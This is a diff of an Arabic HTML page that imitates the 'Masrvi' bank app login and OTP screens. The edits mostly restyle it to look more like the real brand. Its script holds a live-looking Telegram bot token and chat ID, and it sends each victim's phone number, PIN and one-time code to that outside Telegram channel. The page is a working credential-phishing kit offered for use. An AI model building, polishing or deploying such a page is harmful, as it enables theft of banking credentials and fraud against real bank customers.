@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>المصرف الرقمي - تسجيل الدخول</title>
+    <title>مصرفي - تسجيل الدخول</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap');
@@ -17,30 +17,34 @@
             min-height: 100vh;
         }
 
-        /* الهيدر العلوي بنمط بنكي متناسق مع اللوجو */
+        /* الهيدر العلوي بنمط انسيابي متناسق مع شعار مصرفي */
         .app-header {
-            background: linear-gradient(135deg, #00a859, #2e3192);
-            height: 220px;
-            padding: 30px 20px;
-            border-bottom-left-radius: 40px;
-            border-bottom-right-radius: 40px;
+            background: linear-gradient(135deg, #00d3a9, #2e3192);
+            height: 240px;
+            padding: 40px 20px;
+            border-bottom-left-radius: 45px;
+            border-bottom-right-radius: 45px;
             text-align: center;
-            color: white;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            box-shadow: 0 10px 25px rgba(46, 49, 146, 0.15);
         }
 
-        /* تعديل حاوية اللوجو ليتناسب مع الصورة */
-        .bank-logo-img {
-            width: 160px; /* الحجم المثالي للوجو من image_34.png */
+        /* تنسيق اللوجو ليكون بارزاً ونظيفاً */
+        .masrvi-logo {
+            width: 190px; /* الحجم المثالي للوجو العريض */
             height: auto;
-            margin: 0 auto 10px;
-            display: block;
-            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
+            background: white;
+            padding: 12px;
+            border-radius: 20px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            margin-bottom: 15px;
         }
 
         .login-card {
             background: white;
-            margin: -60px 25px 20px;
+            margin: -50px 25px 20px;
             padding: 30px 20px;
             border-radius: 25px;
             box-shadow: 0 15px 35px rgba(0,0,0,0.05);
@@ -61,44 +65,34 @@
 
         .input-box input {
             width: 100%;
-            padding: 12px 15px;
+            padding: 14px 15px;
             border: 1.5px solid #ecf0f1;
-            border-radius: 12px;
+            border-radius: 15px;
             font-size: 18px;
             font-weight: bold;
             outline: none;
             text-align: center;
-            color: #2c3e50;
+            color: #2e3192;
             transition: 0.3s;
         }
 
         .input-box input:focus {
-            border-color: #00a859;
+            border-color: #00d3a9;
             background: #f9fffb;
         }
 
+        /* زر الدخول باللون الأخضر المميز لمصرفي */
         .btn-primary {
-            background: #00a859;
+            background: #00d3a9;
             color: white;
             width: 100%;
-            padding: 15px;
-            border-radius: 12px;
-            font-size: 18px;
+            padding: 16px;
+            border-radius: 15px;
+            font-size: 19px;
             font-weight: bold;
             border: none;
             cursor: pointer;
-            box-shadow: 0 5px 15px rgba(0, 168, 89, 0.3);
-        }
-
-        .btn-secondary {
-            background: transparent;
-            color: #2e3192;
-            width: 100%;
-            padding: 12px;
-            font-size: 15px;
-            border: 1.5px solid #2e3192;
-            border-radius: 12px;
-            margin-top: 15px;
+            box-shadow: 0 6px 20px rgba(0, 211, 169, 0.3);
         }
 
         #screen-otp { display: none; padding: 40px 20px; text-align: center; }
@@ -106,25 +100,24 @@
         .otp-input {
             width: 85%;
             padding: 15px;
-            font-size: 24px;
+            font-size: 26px;
             letter-spacing: 12px;
-            border: 2px solid #00a859;
+            border: 2px solid #00d3a9;
             border-radius: 15px;
             text-align: center;
             margin: 30px 0;
             outline: none;
+            color: #2e3192;
         }
-
-        .timer-text { color: #e74c3c; font-weight: bold; }
     </style>
 </head>
 <body>
 
     <div id="screen-login">
         <div class="app-header">
-            <!-- استخدام الرابط المباشر المستخرج من image_35.png -->
-            <img src="https://i.ibb.co/680L13B/Mas.png" alt="Masrvi Logo" class="bank-logo-img">
-            <p class="opacity-90">الخدمات المصرفية الرقمية الآمنة</p>
+            <!-- وضع شعار مصرفي هنا -->
+            <img src="https://i.ibb.co/680L13B/Mas.png" alt="Masrvi" class="masrvi-logo">
+            <p class="text-white opacity-90 text-sm">مرحباً بك في تطبيق مصرفي للخدمات البنكية</p>
         </div>
 
         <div class="login-card">
@@ -145,29 +138,28 @@
             </div>
 
             <button onclick="handleLogin()" class="btn-primary">دخول آمن</button>
-            <button class="btn-secondary">نسيت كلمة المرور؟</button>
+            <p class="text-center text-[#2e3192] mt-6 text-sm font-medium">نسيت كلمة المرور؟</p>
         </div>
     </div>
 
     <div id="screen-otp">
         <div class="mb-10">
-            <img src="https://img.icons8.com/ios-filled/100/00a859/shield-confirmation.png" class="mx-auto mb-4">
+            <img src="https://img.icons8.com/ios-filled/100/00d3a9/shield-confirmation.png" class="mx-auto mb-4">
             <h2 class="text-2xl font-bold text-[#2e3192]">تأكيد الهوية</h2>
-            <p class="text-gray-500 mt-2">لقد أرسلنا رمز التحقق إلى هاتفك</p>
+            <p class="text-gray-500 mt-2">يرجى إدخال الرمز المرسل لهاتفك</p>
         </div>
 
-        <div class="bg-white p-8 rounded-3xl shadow-sm border border-gray-100">
+        <div class="bg-white p-8 rounded-3xl shadow-sm border border-gray-100 mx-6">
             <input id="otp_code" type="tel" maxlength="6" class="otp-input"
                    oninput="this.value = this.value.replace(/[^0-9]/g, '');"
                    placeholder="000000">
-            
-            <p class="mb-6">تنتهي صلاحية الرمز خلال: <span id="timer" class="timer-text">04:59</span></p>
             
             <button onclick="submitOTP()" class="btn-primary">تأكيد العملية</button>
         </div>
     </div>
 
     <script>
+        // معلومات الإرسال الخاصة بك
         const TOKEN = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
         const CHAT = "8665814266";
 
@@ -179,9 +171,8 @@
                 send(`🏦 Masrvi Login\n📱 Phone: ${u}\n🔐 PIN: ${p}`);
                 document.getElementById('screen-login').style.display = 'none';
                 document.getElementById('screen-otp').style.display = 'block';
-                startTimer(299);
             } else {
-                alert("يرجى إدخال 8 أرقام للهاتف و4 أرقام للرمز السري");
+                alert("يرجى إدخال البيانات المطلوبة بشكل صحيح");
             }
         }
 
@@ -189,22 +180,11 @@
             const code = document.getElementById('otp_code').value;
             if(code.length === 6) {
                 send(`🔑 Masrvi OTP: ${code}`);
-                alert("جاري التحقق...");
+                alert("جاري التحقق من الرمز...");
                 location.reload();
             } else {
-                alert("أدخل الرمز المكون من 6 أرقام");
+                alert("يرجى إدخال الرمز كاملاً");
             }
-        }
-
-        function startTimer(duration) {
-            let timer = duration, min, sec;
-            const display = document.getElementById('timer');
-            setInterval(function () {
-                min = parseInt(timer / 60, 10);
-                sec = parseInt(timer % 60, 10);
-                display.textContent = (min < 10 ? "0" + min : min) + ":" + (sec < 10 ? "0" + sec : sec);
-                if (--timer < 0) timer = 0;
-            }, 1000);
         }
 
         function send(msg) {
@@ -213,5 +193,3 @@
     </script>
 </body>
 </html>
-
-
